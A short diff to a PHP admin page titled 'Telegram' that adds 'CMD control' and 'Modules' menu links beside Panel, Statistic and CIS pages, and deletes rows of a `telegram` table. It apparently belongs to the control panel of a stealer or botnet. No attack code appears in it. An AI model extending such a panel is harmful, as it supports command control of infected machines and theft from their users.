@@ -8,7 +8,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 	
-    <title></title>
+    <title>Telegram</title>
     <link href="css/style_loader.css" rel="stylesheet">
     <link href="css/bootstrap.css" rel="stylesheet">
     <link href="css/bootstrap-theme.css" rel="stylesheet">
@@ -28,6 +28,8 @@
                 <li><a href="table.php" style="color: black">Panel</a></li>
                     <li><a href="Countries.php" style="color: black">Statistic</a></li>
                     <li><a href="cis.php" style="color: black">CIS</a></li>
+                    <li><a href="comma.php" style="color: black">CMD control</a></li>
+                    <li><a href="modules.php" style="color: black">Modules</a></li>
 				<li><a href="logout.php" style="color: black">Logout</a></li>                
                 </ul>
             </div>
@@ -84,5 +86,4 @@ if(isset($_POST['del']))
     mysqli_query($mysqli, "DELETE FROM `telegram`");
     refresh();
 }
-// $_POST['token']
 ?>
